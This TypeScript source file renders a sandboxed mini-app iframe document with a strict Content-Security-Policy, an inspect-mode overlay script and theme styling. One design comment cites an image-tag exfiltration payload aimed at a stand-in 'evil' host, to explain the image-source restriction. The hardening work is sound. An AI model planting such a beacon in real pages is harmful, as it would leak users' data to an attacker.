/**
 * The mini-app sandbox FRAME document — the HTML a sandboxed iframe navigates
 * to (GET /api/apps/[id]/frame or /s/[token]/frame). Pure string building, no
 * DOM: the SERVER renders this, which is the point of the design. The old
 * client-built `srcdoc` approach assigned the document to an iframe already in
 * the DOM, and that assignment could race the element's initial about:blank
 * navigation and be silently dropped (the "Loading… forever" bug). A `src`
 * navigation to this route cannot be lost, the CSP rides a response header
 * instead of a <meta> tag, and the document is curl-able and cacheable.
 *
 * The iframe stays `sandbox="allow-scripts"` (opaque origin): the app gets no
 * cookies, no storage, no parent DOM. Its only egress is the postMessage
 * bridge to the parent AppSandbox, which brokers tool + sqlite calls
 * server-side.
 */

/** The strict sandbox CSP, served as a Content-Security-Policy HEADER on the
 *  frame response. The app may only render — NO network of its own.
 *  `connect-src 'none'` blocks fetch/XHR/WebSocket, and img/font loads are
 *  network too, so they're held to inline sources (data:/blob:) plus the HOST
 *  ORIGIN only — a wildcard would be an exfil channel
 *  (`<img src="https://evil/?d=…">`) despite connect-src 'none'. Same-origin
 *  images are deliberately allowed (Mantle is single-tenant; a request to our
 *  own server leaks nothing) so apps can show brain images and share
 *  attachments. The document's origin is OPAQUE (sandboxed), so CSP `'self'`
 *  is unreliable here — every source names the host origin explicitly:
 *  scripts only from `/app-runtime/` (the shared React/kit/host runtime the
 *  import map points at), styles/fonts only from `/share-runtime/` (the
 *  self-contained stylesheet the frame links) and `/fonts/` (owner font
 *  library). */
export function buildAppFrameCsp(origin: string): string {
  return (
    `default-src 'none'; style-src 'unsafe-inline' ${origin}/share-runtime/; ` +
    `script-src 'unsafe-inline' ${origin}/app-runtime/; ` +
    `img-src data: blob: ${origin}; ` +
    `font-src data: ${origin}/share-runtime/ ${origin}/fonts/; ` +
    "connect-src 'none'; base-uri 'none'; form-action 'none'"
  );
}

// Host-injected "inspect mode" overlay. Lives in the iframe but is NOT part of
// the app bundle, so it works on every app with no rebuild and stays a host
// concern. When the parent posts {kind:'inspect',on:true}, hovering outlines the
// nearest [data-app-region] ancestor and clicking locks it (clicking the same
// one clears it). The locked region is posted back as {kind:'select'}; the
// parent feeds it to Appsmith as focusRegionIds. Esc exits. Pure DOM, defensive.
// It also applies parent-posted {kind:'theme'} updates so a live theme switch
// restyles a running app without a reload.
const INSPECTOR = `
(function(){
  var on=false, locked=null, hovered=null, lbl=null;
  function regionOf(el){
    while(el && el.nodeType===1 && el!==document.body){
      if(el.getAttribute && el.hasAttribute('data-app-region')) return el;
      el=el.parentElement;
    }
    return null;
  }
  function q(id){ try{ return id ? document.querySelector('[data-app-region="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]') : null; }catch(e){ return null; } }
  function label(){
    if(!lbl){
      lbl=document.createElement('div');
      lbl.style.cssText='position:fixed;z-index:2147483647;pointer-events:none;display:none;font:500 11px/1.4 ui-sans-serif,system-ui,sans-serif;padding:2px 6px;border-radius:4px;background:var(--ring,#3b82f6);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.35);white-space:nowrap;';
      document.body.appendChild(lbl);
    }
    return lbl;
  }
  function paintLocked(){
    var prev=document.querySelectorAll('[data-app-locked]');
    for(var i=0;i<prev.length;i++){ prev[i].removeAttribute('data-app-locked'); prev[i].style.outline=''; prev[i].style.outlineOffset=''; }
    var el=q(locked);
    if(el){ el.setAttribute('data-app-locked','1'); el.style.outline='2px solid var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
  }
  function clearHover(){
    if(hovered && !hovered.hasAttribute('data-app-locked')){ hovered.style.outline=''; hovered.style.outlineOffset=''; }
    hovered=null;
    if(lbl) lbl.style.display='none';
  }
  function onMove(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(el===hovered) return;
    clearHover();
    if(!el) return;
    hovered=el;
    if(!el.hasAttribute('data-app-locked')){ el.style.outline='2px dashed var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
    var r=el.getBoundingClientRect(), L=label();
    L.textContent=el.getAttribute('data-app-region');
    L.style.display='block';
    L.style.left=Math.max(2,r.left)+'px';
    L.style.top=Math.max(2,r.top-20)+'px';
  }
  function onClick(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(!el) return;
    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
    var id=el.getAttribute('data-app-region');
    locked=(locked===id)?null:id;
    clearHover(); paintLocked();
    window.parent.postMessage({ v:1, kind:'select', regionId:locked, label:locked }, '*');
    onMove(e);
  }
  function setOn(v){ on=v; document.body.style.cursor=v?'crosshair':''; if(!v) clearHover(); }
  window.addEventListener('message', function(e){
    if(e.source!==window.parent) return;
    var m=e.data; if(!m||m.v!==1) return;
    if(m.kind==='inspect'){ setOn(!!m.on); return; }
    if(m.kind==='select'){ locked=m.regionId||null; clearHover(); paintLocked(); return; }
    if(m.kind==='theme'){ var h=document.documentElement; h.className=m.cls||''; if(m.colorTheme){ h.setAttribute('data-color-theme', m.colorTheme); } else { h.removeAttribute('data-color-theme'); } return; }
  });
  document.addEventListener('mousemove', onMove, true);
  document.addEventListener('click', onClick, true);
  document.addEventListener('keydown', function(e){ if(on && e.key==='Escape'){ setOn(false); window.parent.postMessage({v:1,kind:'inspect',on:false},'*'); } });
})();
`;

/** HTML-attribute escape for the theme values baked into the <html> tag —
 *  they arrive as query params, so they are untrusted for MARKUP purposes
 *  even though a wrong theme is harmless. */
function attr(v: string): string {
  return v.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
}

export function buildAppFrameHtml(opts: {
  /** The app's built module bundle (esbuild output; esbuild escapes any
   *  `</script` inside string literals, so inlining it is safe). */
  bundleCode: string;
  /** Per-app compiled Tailwind utilities ('' when the build predates CSS). */
  appCss: string;
  /** The shared-runtime import map JSON (specifier → hashed /app-runtime URL). */
  importMapJson: string;
  /** Theme parity, baked at mint time: the host page's <html> class and
   *  data-color-theme. Live changes arrive via the postMessage theme sync. */
  cls: string;
  colorTheme: string | null;
  /** Viewport frame (iframe IS the viewport) vs card frame (auto-sized). */
  viewport: boolean;
}): string {
  const colorThemeAttr = opts.colorTheme ? ` data-color-theme="${attr(opts.colorTheme)}"` : '';
  return `<!doctype html>
<html class="${attr(opts.cls)}"${colorThemeAttr}>
<head>
<meta charset="utf-8" />
<script type="importmap">${opts.importMapJson}</script>
<link rel="stylesheet" href="/share-runtime/styles.css" />
<link rel="stylesheet" href="/share-runtime/katex/katex.min.css" />
<style>${
    /* Per-app compiled utilities — classes the app's own source uses that
   the shared sheet never scanned. After the shared styles so its @layer order
   is already established. The `</` guard keeps CSS content (arbitrary values
   can hold strings) from closing the tag; the app already runs its own JS in
   this iframe, so this is markup hygiene, not a security boundary. */
    opts.appCss.replace(/<\//g, '<\\/')
  }</style>
<style>/* Paint the iframe canvas with the theme background, NOT transparent: a
   sandboxed (opaque-origin) iframe renders WHITE where it's transparent, so any
   gap between the app content and the iframe height showed a white strip. With
   the themed background, any such gap is invisible (matches the app + host). */
html,body{margin:0;background:var(--background)}#root{padding:0}
/* Themed scrollbars for the WHOLE app. The host only styles scrollbars behind an
   opt-in .scrollbar-thin class, so an app's own scroll containers otherwise fall
   back to the default wide OS scrollbar with a white/grey track that clashes with
   the theme. Apply the thin, theme-token look to every scroller inside the iframe
   (scoped here, so the host is untouched). Vars resolve from the linked theme. */
*{scrollbar-width:thin;scrollbar-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent) transparent}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent);border-radius:6px;border:2px solid transparent;background-clip:padding-box}
::-webkit-scrollbar-thumb:hover{background-color:color-mix(in oklab,var(--muted-foreground) 50%,transparent);background-clip:padding-box}
::-webkit-scrollbar-corner{background:transparent}
${
  opts.viewport
    ? `/* Viewport frame: the iframe IS the viewport, so viewport-height utilities
   are real and the app owns its own layout + scrolling. Full-height plumbing
   so h-full works from the root down. */
html,body,#root{height:100%}
body{overflow:auto}`
    : `/* Card frame: the app is embedded in an auto-sized iframe with no real
   viewport, so viewport-height utilities would inflate it into a tall,
   mostly-empty box (a small app leaves a big blank area below). Collapse them
   to content height — the iframe then hugs the actual content. Belt-and-braces
   with the authoring rule that tells Appsmith not to use these. */
.min-h-screen,.min-h-dvh,.min-h-svh,.min-h-lvh{min-height:0!important}
.h-screen,.h-dvh,.h-svh,.h-lvh{height:auto!important}`
}</style>
</head>
<body class="bg-background text-foreground">
<div id="root"></div>
<script type="module">${opts.bundleCode}</script>
<script>${INSPECTOR}</script>
</body>
</html>`;
}
